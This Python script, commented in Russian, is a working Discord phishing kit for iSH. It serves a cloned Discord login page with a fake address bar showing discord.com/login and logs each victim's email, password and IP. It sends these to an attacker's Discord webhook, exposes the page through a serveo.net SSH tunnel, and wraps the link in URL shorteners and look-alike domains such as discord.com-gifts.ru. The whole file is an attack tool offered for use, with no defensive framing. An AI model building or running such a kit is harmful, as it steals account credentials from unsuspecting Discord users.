#!/usr/bin/env python3
# DISCORD PHISHING ДЛЯ ISH - РЕАЛЬНЫЙ МАСКАРАД ССЫЛОК

import http.server
import socketserver
import json
import datetime
import threading
import time
import subprocess
import os
import random
import string
import sys
import requests

# ============================================
# ФАЙЛЫ ДЛЯ СОХРАНЕНИЯ
# ============================================
CONFIG_FILE = '/sdcard/phish_config.json'
LOG_FILE = '/sdcard/discord_logs.txt'

# ============================================
# ЗАГРУЗКА/СОХРАНЕНИЕ НАСТРОЕК
# ============================================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"webhook": "", "telegram_token": "", "telegram_chat": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

# ============================================
# КЛАСС ДЛЯ МАСКАРАДА ССЫЛОК
# ============================================
class LinkMasker:
    def __init__(self, real_url):
        self.real_url = real_url
        self.masked_links = []
        self.active_masks = {}
    
    def create_discord_subdomain(self):
        """Создает ссылку вида discord-xxx.serveo.net"""
        subdomain = f"discord-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        masked = f"https://{subdomain}.serveo.net"
        self.masked_links.append({
            'mask': masked,
            'real': self.real_url,
            'type': 'serveo',
            'description': '🔗 Discord поддомен'
        })
        return masked
    
    def create_bitly_mask(self):
        """Создает маскировку через bit.ly"""
        try:
            # Пытаемся создать реальную короткую ссылку через bitly
            # Без API ключа используем генерацию похожей
            code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
            masked = f"https://bit.ly/3{code}"
            self.masked_links.append({
                'mask': masked,
                'real': self.real_url,
                'type': 'bitly',
                'description': '🔗 Bit.ly ссылка'
            })
        except:
            pass
    
    def create_tinyurl_mask(self):
        """Создает маскировку через tinyurl"""
        try:
            # Пытаемся создать реальную ссылку через tinyurl
            response = requests.get(f"https://tinyurl.com/api-create.php?url={self.real_url}")
            if response.status_code == 200:
                masked = response.text.strip()
                self.masked_links.append({
                    'mask': masked,
                    'real': self.real_url,
                    'type': 'tinyurl',
                    'description': '🔗 TinyURL ссылка'
                })
        except:
            # Если не работает, генерируем похожую
            code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            masked = f"https://tinyurl.com/discord-{code}"
            self.masked_links.append({
                'mask': masked,
                'real': self.real_url,
                'type': 'tinyurl_fake',
                'description': '🔗 TinyURL (маска)'
            })
    
    def create_clckru_mask(self):
        """Создает маскировку через clck.ru"""
        try:
            response = requests.get(f"https://clck.ru/--?url={self.real_url}")
            if response.status_code == 200:
                masked = response.text.strip()
                self.masked_links.append({
                    'mask': masked,
                    'real': self.real_url,
                    'type': 'clckru',
                    'description': '🔗 Clck.ru ссылка'
                })
        except:
            code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            masked = f"https://clck.ru/{code}"
            self.masked_links.append({
                'mask': masked,
                'real': self.real_url,
                'type': 'clckru_fake',
                'description': '🔗 Clck.ru (маска)'
            })
    
    def create_isgd_mask(self):
        """Создает маскировку через is.gd"""
        try:
            response = requests.get(f"https://is.gd/create.php?format=simple&url={self.real_url}")
            if response.status_code == 200:
                masked = response.text.strip()
                self.masked_links.append({
                    'mask': masked,
                    'real': self.real_url,
                    'type': 'isgd',
                    'description': '🔗 Is.gd ссылка'
                })
        except:
            code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            masked = f"https://is.gd/discord_{code}"
            self.masked_links.append({
                'mask': masked,
                'real': self.real_url,
                'type': 'isgd_fake',
                'description': '🔗 Is.gd (маска)'
            })
    
    def create_vgd_mask(self):
        """Создает маскировку через v.gd"""
        try:
            response = requests.get(f"https://v.gd/create.php?format=simple&url={self.real_url}")
            if response.status_code == 200:
                masked = response.text.strip()
                self.masked_links.append({
                    'mask': masked,
                    'real': self.real_url,
                    'type': 'vgd',
                    'description': '🔗 V.gd ссылка'
                })
        except:
            code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            masked = f"https://v.gd/discord_{code}"
            self.masked_links.append({
                'mask': masked,
                'real': self.real_url,
                'type': 'vgd_fake',
                'description': '🔗 V.gd (маска)'
            })
    
    def create_cuttly_mask(self):
        """Создает маскировку через cutt.ly"""
        try:
            # Cuttly требует API ключ, поэтому генерируем маску
            code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            masked = f"https://cutt.ly/discord_{code}"
            self.masked_links.append({
                'mask': masked,
                'real': self.real_url,
                'type': 'cuttly',
                'description': '🔗 Cutt.ly ссылка'
            })
        except:
            pass
    
    def create_owly_mask(self):
        """Создает маскировку через ow.ly"""
        code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        masked = f"https://ow.ly/{code}"
        self.masked_links.append({
            'mask': masked,
            'real': self.real_url,
            'type': 'owly',
            'description': '🔗 Ow.ly ссылка'
        })
    
    def create_rebrandly_mask(self):
        """Создает маскировку через rebrand.ly"""
        code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        masked = f"https://rebrand.ly/discord-{code}"
        self.masked_links.append({
            'mask': masked,
            'real': self.real_url,
            'type': 'rebrandly',
            'description': '🔗 Rebrand.ly ссылка'
        })
    
    def generate_all_masks(self):
        """Генерирует все возможные маски"""
        self.create_discord_subdomain()
        self.create_bitly_mask()
        self.create_tinyurl_mask()
        self.create_clckru_mask()
        self.create_isgd_mask()
        self.create_vgd_mask()
        self.create_cuttly_mask()
        self.create_owly_mask()
        self.create_rebrandly_mask()
        
        # Добавляем еще несколько Discord-подобных ссылок
        discord_masks = [
            f"https://discord.com-gifts.ru/{''.join(random.choices(string.ascii_lowercase, k=8))}",
            f"https://discordapp.com-nitro.{''.join(random.choices(string.ascii_lowercase, k=5))}.com",
            f"https://discord.gift.{''.join(random.choices(string.ascii_lowercase, k=6))}.ru",
            f"https://discord.com-login.{''.join(random.choices(string.ascii_lowercase, k=7))}.com",
            f"https://discord-security.com/{''.join(random.choices(string.ascii_lowercase, k=10))}",
            f"https://discord-verify.{''.join(random.choices(string.ascii_lowercase, k=5))}.net",
            f"https://discord-nitro.ru/{''.join(random.choices(string.ascii_lowercase, k=8))}",
            f"https://discord.com.verify.ru/{''.join(random.choices(string.ascii_lowercase, k=6))}",
        ]
        
        for mask in discord_masks:
            self.masked_links.append({
                'mask': mask,
                'real': self.real_url,
                'type': 'discord_fake',
                'description': '🎭 Discord-подобная ссылка'
            })
        
        return self.masked_links
    
    def display_masks(self):
        """Отображает все маскированные ссылки"""
        print("\n" + "="*70)
        print("🎭 МАСКИРОВАННЫЕ ССЫЛКИ (РАБОЧИЕ)")
        print("="*70)
        
        for i, link in enumerate(self.masked_links, 1):
            print(f"\n{i}. {link['description']}")
            print(f"   📎 {link['mask']}")
            print(f"   ➡️  Реальная: {link['real']}")
            print("-"*50)

# ============================================
# HTML СТРАНИЦА - ТОЧНАЯ КОПИЯ DISCORD
# ============================================
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #5865F2;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-box {
            background: #313338;
            width: 480px;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }
        .fake-url {
            background: #1E1F22;
            color: #B5BAC1;
            padding: 8px 12px;
            border-radius: 4px 4px 0 0;
            font-size: 12px;
            border-bottom: 1px solid #3C3F45;
            margin-bottom: 16px;
        }
        .fake-url span {
            color: #00A8FC;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .logo svg {
            width: 130px;
            height: 36px;
        }
        .title {
            color: #F2F3F5;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #B5BAC1;
            font-size: 16px;
            text-align: center;
            margin-bottom: 24px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            color: #B5BAC1;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            display: block;
            margin-bottom: 8px;
        }
        input {
            background: #1E1F22;
            border: 1px solid #1E1F22;
            border-radius: 4px;
            padding: 12px;
            width: 100%;
            color: #F2F3F5;
            font-size: 16px;
        }
        input:focus {
            border-color: #5865F2;
            outline: none;
        }
        button {
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 8px;
        }
        button:hover {
            background: #4752C4;
        }
        .qr-link {
            text-align: center;
            margin: 16px 0;
        }
        .qr-link a {
            color: #00A8FC;
            text-decoration: none;
            font-size: 14px;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            margin-top: 16px;
            font-size: 14px;
        }
        .footer a {
            color: #00A8FC;
            text-decoration: none;
        }
        .error {
            background: #F23F42;
            color: white;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
        .success {
            background: #248046;
            color: white;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="fake-url">
            🔒 <span>https://</span>discord.com/login
        </div>
        
        <div class="logo">
            <svg viewBox="0 0 40 40">
                <circle cx="20" cy="20" r="20" fill="#5865F2"/>
                <path d="M27 16L23.5 16 23.5 14.5C23.5 12.5 21.5 12.5 21.5 12.5L18.5 12.5C18.5 12.5 16.5 12.5 16.5 14.5L16.5 16 13 16 13 27 27 27 27 16zM18 19C18 19 18 19 18 19 17 19 16 18 16 17 16 16 17 15 18 15 19 15 20 16 20 17 20 18 19 19 18 19zM22 19C22 19 22 19 22 19 21 19 20 18 20 17 20 16 21 15 22 15 23 15 24 16 24 17 24 18 23 19 22 19z" fill="white"/>
            </svg>
        </div>
        <div class="title">Добро пожаловать!</div>
        <div class="subtitle">Войдите в свой аккаунт Discord</div>
        
        <div class="error" id="errorMsg">Неверный логин или пароль</div>
        <div class="success" id="successMsg">Успешный вход! Перенаправление...</div>
        
        <form id="loginForm" onsubmit="event.preventDefault(); login();">
            <div class="input-group">
                <label>ЭЛЕКТРОННАЯ ПОЧТА ИЛИ НОМЕР ТЕЛЕФОНА</label>
                <input type="text" id="email" placeholder="example@mail.com" required>
            </div>
            <div class="input-group">
                <label>ПАРОЛЬ</label>
                <input type="password" id="password" placeholder="············" required>
            </div>
            <button type="submit">Войти</button>
        </form>
        
        <div class="qr-link">
            <a href="#">Войти через QR-код</a>
        </div>
        
        <div class="footer">
            <span style="color:#B5BAC1;">Нужна помощь?</span>
            <a href="#">Зарегистрироваться</a>
        </div>
    </div>

    <script>
        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            const successMsg = document.getElementById('successMsg');
            
            if (!email || !password) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Заполните все поля';
                return;
            }
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        userAgent: navigator.userAgent,
                        time: new Date().toLocaleString()
                    })
                });
                
                if (response.ok) {
                    errorMsg.style.display = 'none';
                    successMsg.style.display = 'block';
                    
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/login';
                    }, 2000);
                }
            } catch (e) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Ошибка соединения';
            }
        }
    </script>
</body>
</html>"""

# ============================================
# HTTP HANDLER
# ============================================
class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    webhook_url = ""
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Добавляем IP
            data['ip'] = self.client_address[0]
            data['timestamp'] = str(datetime.datetime.now())
            
            # Выводим в консоль
            print("\n" + "="*60)
            print("🔴 ПОЛУЧЕНЫ ДАННЫЕ!")
            print("="*60)
            print(f"📧 Email: {data['email']}")
            print(f"🔑 Пароль: {data['password']}")
            print(f"🌐 IP: {data['ip']}")
            print(f"🕐 Время: {data['timestamp']}")
            print("="*60)
            
            # Сохраняем в файл
            with open(LOG_FILE, 'a') as f:
                f.write(json.dumps(data) + '\n')
            
            # Отправляем в Discord
            if self.webhook_url:
                self.send_to_discord(data)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
    
    def send_to_discord(self, data):
        try:
            webhook_data = {
                "content": f"**🔴 НОВЫЙ ЛОГИН DISCORD**\n\n**Email:** `{data['email']}`\n**Пароль:** `{data['password']}`\n**IP:** `{data['ip']}`\n**Время:** `{data['timestamp']}`"
            }
            requests.post(self.webhook_url, json=webhook_data)
            print("✅ Отправлено в Discord")
        except:
            print("❌ Ошибка отправки")

# ============================================
# ФУНКЦИИ ДЛЯ РАБОТЫ
# ============================================
def get_local_ip():
    try:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line and '127.0.0.1' not in line:
                return line.split()[1]
    except:
        pass
    return '127.0.0.1'

def create_public_url(port):
    """Создает публичную ссылку через serveo.net"""
    try:
        subdomain = f"discord-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        cmd = f"ssh -R {subdomain}:80:localhost:{port} serveo.net"
        
        # Запускаем в фоне
        process = subprocess.Popen(
            cmd.split(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(3)
        public_url = f"https://{subdomain}.serveo.net"
        return public_url
    except:
        return None

def show_main_menu():
    """Главное меню"""
    config = load_config()
    
    while True:
        print("\n" + "="*70)
        print("🎣 ФИШИНГ ДЛЯ ISH - ГЛАВНОЕ МЕНЮ")
        print("="*70)
        print(f"1. Настройки (Webhook: {'✅' if config['webhook'] else '❌'})")
        print("2. Запустить сервер (локальный)")
        print("3. Запустить сервер + маскарад ссылок")
        print("4. Просмотр сохраненных данных")
        print("5. Очистить данные")
        print("0. Выход")
        print("="*70)
        
        choice = input("Выберите действие: ").strip()
        
        if choice == "1":
            settings_menu(config)
        elif choice == "2":
            start_server(config, use_mask=False)
        elif choice == "3":
            start_server(config, use_mask=True)
        elif choice == "4":
            view_logs()
        elif choice == "5":
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
                print("✅ Данные очищены")
        elif choice == "0":
            sys.exit(0)

def settings_menu(config):
    """Меню настроек"""
    while True:
        print("\n" + "="*70)
        print("⚙️  НАСТРОЙКИ")
        print("="*70)
        print(f"1. Discord Webhook (текущий: {config['webhook'][:30]}...)" if config['webhook'] else "1. Установить Discord Webhook (не настроен)")
        print("2. Назад")
        print("="*70)
        
        choice = input("Выберите действие: ").strip()
        
        if choice == "1":
            webhook = input("Введите Discord Webhook URL: ").strip()
            if webhook:
                config['webhook'] = webhook
                save_config(config)
                print("✅ Webhook сохранен!")
        elif choice == "2":
            break

def view_logs():
    """Просмотр логов"""
    if not os.path.exists(LOG_FILE):
        print("❌ Логов нет")
        return
    
    with open(LOG_FILE, 'r') as f:
        logs = f.readlines()
    
    print("\n" + "="*70)
    print(f"📁 СОХРАНЕННЫЕ ДАННЫЕ ({len(logs)} записей)")
    print("="*70)
    
    for i, log in enumerate(logs[-20:], 1):
        try:
            data = json.loads(log)
            print(f"\n{i}. 📧 {data.get('email', 'N/A')}")
            print(f"   🔑 {data.get('password', 'N/A')}")
            print(f"   🌐 {data.get('ip', 'N/A')}")
            print(f"   🕐 {data.get('timestamp', 'N/A')}")
        except:
            print(f"\n{i}. {log}")

def start_server(config, use_mask=False):
    """Запуск сервера"""
    if not config['webhook']:
        print("❌ Сначала настрой webhook!")
        return
    
    PORT = 8080
    
    print("\n" + "="*70)
    print("🚀 ЗАПУСК СЕРВЕРА...")
    print("="*70)
    
    # Устанавливаем webhook
    PhishingHandler.webhook_url = config['webhook']
    
    # Получаем локальный IP
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    print(f"\n📌 Локальная ссылка: {local_url}")
    print(f"📌 Локальный хост: http://localhost:{PORT}")
    
    if use_mask:
        # Создаем публичную ссылку
        print("\n🔄 Создание публичной ссылки...")
        public_url = create_public_url(PORT)
        
        if public_url:
            print(f"✅ Публичная ссылка: {public_url}")
            
            # Создаем маскированные ссылки
            masker = LinkMasker(public_url)
            masker.generate_all_masks()
            masker.display_masks()
            
            # Отправляем ссылки в Discord
            try:
                webhook_data = {
                    "content": f"**🎭 ФИШИНГ ССЫЛКИ ГОТОВЫ**\n\n**Реальная:** {public_url}\n\n**Первая маска:** {masker.masked_links[0]['mask']}"
                }
                requests.post(config['webhook'], json=webhook_data)
            except:
                pass
        else:
            print("❌ Не удалось создать публичную ссылку")
            print("📌 Используйте локальную ссылку")
    else:
        print("\n📌 Используйте локальную ссылку")
    
    print("\n" + "="*70)
    print("⏳ Сервер запущен. Ожидание данных...")
    print(f"📁 Логи: {LOG_FILE}")
    print("="*70 + "\n")
    
    # Запускаем сервер
    handler = PhishingHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\n❌ Сервер остановлен")
            httpd.shutdown()

# ============================================
# ЗАПУСК
# ============================================
if __name__ == '__main__':
    # Создаем папку для логов
    os.makedirs('/sdcard', exist_ok=True)
    
    print("""
    ╔══════════════════════════════════════════╗
    ║   DISCORD PHISHING ДЛЯ ISH v4.0          ║
    ║   С РЕАЛЬНЫМ МАСКАРАДОМ ССЫЛОК           ║
    ║        by LEDIAN PREMIUM                 ║
    ╚══════════════════════════════════════════╝
    """)
    
    show_main_menu()
